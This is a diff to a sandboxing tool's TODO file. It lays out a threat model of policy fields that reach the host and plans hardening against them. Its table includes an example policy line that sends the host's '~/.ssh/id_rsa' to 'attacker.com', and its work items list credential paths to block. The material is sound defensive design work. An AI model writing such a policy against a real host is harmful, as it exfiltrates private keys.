@@ -1,22 +1,49 @@
 # TODO
 
-## Next: policy guard for `ro_bind` (after the TOML review)
+## Next: policy guard (after the TOML review)
 
-The policy file is trusted input: `ro_bind` exposes any host path it names,
-read-only, so a policy can hand the box `~/.ssh`. Fine when the machine
-owner writes every policy; a hole once someone else can.
+The policy file is trusted input: several fields reach into the HOST, not
+just the box. Fine when the machine owner writes every policy; a hole once
+someone else can (a hosted service where users define their agents).
 
-1. **Refuse sensitive binds by default** — `~/.ssh`, `~/.aws`, `~/.gnupg`,
-   `~/.config/gh`, `~/.claude`, plybox's own sessions/state dirs,
-   `/etc/shadow`, … (and any path *containing* one of them, e.g. `~`).
-   Override only with an explicit `--allow-sensitive-bind`.
-2. **Print every bind at startup** (unless `--quiet`) and record them in the
-   session's start event, so what the box can read is visible and audited.
-3. **Operator allow-list (for hosting others' code)** — the host owner lists
-   the folders that may ever be bound (e.g. `/etc/plybox/operator.toml`);
-   plybox refuses anything else, whatever the policy or flags ask. Until
-   this exists, a hosting service must never pass user-supplied flags
-   (`--ro-bind`, `--allow`, `--env`, `--secret`) through to plybox.
+### Fields that touch the host — operator-only
+
+| Field | What a hostile policy can do with it |
+|---|---|
+| `secrets.*.file` | **Worst.** `file = "~/.ssh/id_rsa", only = "attacker.com"` + `allow` it: plybox reads the host file and sends it to that host. The mode check passes (a private key is 0600). |
+| `secrets` (env form, `NAME@HOST`) | sends the supervisor's own environment variable to a host of the policy's choosing |
+| `fs.workspace` | a host path: `workspace = "/etc"` or `"~"` exposes it (as the overlay's lower layer) |
+| `fs.ro_bind` | exposes any host path read-only, e.g. `~/.ssh` |
+| `fs.rootfs` | `"host"` shows host `/usr`; a directory path shows that directory |
+| `net.map` | resolves a name to any IP, skipping the public-address rule → internal network (test-only feature) |
+| `net.trust_ca` | reads a host file (and makes the proxy trust it upstream) |
+| `isolation`, `runsc` | downgrade gVisor → namespaces; point at another binary |
+| `--learn`, `--session`, `--resume` | open the network; choose where state is written; reuse another session |
+
+Safe for a user to set, with validation: the command, `image` (approved
+list), `env` (non-secret values — they are saved in plain text), `net.allow`
+(approved hosts only), `limits` (clamped to operator maximums).
+
+### Work
+
+1. **Refuse sensitive host paths by default** in `ro_bind`, `workspace`,
+   `rootfs`, `trust_ca` and `secrets.*.file` — `~/.ssh`, `~/.aws`, `~/.gnupg`,
+   `~/.config/gh`, `~/.claude`, `~/.config/plybox` (except the declared
+   secret file itself, for `secrets.*.file`), plybox's own sessions/state
+   dirs, `/etc/shadow`, … and any path that *contains* one of them (e.g. `~`,
+   `/home`, `/`). Override only with an explicit `--allow-sensitive-path`.
+2. **Print every host path the box can read, every secret file and every
+   `map` at startup** (unless `--quiet`), and record them in the session's
+   start event, so exposure is visible and audited.
+3. **Operator ceilings (for hosting others' code)** — an operator file
+   (e.g. `/etc/plybox/operator.toml`) that plybox enforces whatever the
+   policy or flags say: allowed path roots for `ro_bind`/`workspace`;
+   approved images/registries; the host list `net.allow` must be a subset of;
+   maximum limits; forced `isolation = "gvisor"`; secrets only from
+   operator-named files; `map`, `trust_ca`, `--learn` disabled.
+4. **Until 3 exists, a hosting service must** generate the full policy
+   itself from a small user request (image, command, env, hosts, limits),
+   and never pass user input through as plybox flags.
 
 ## Known, documented
 
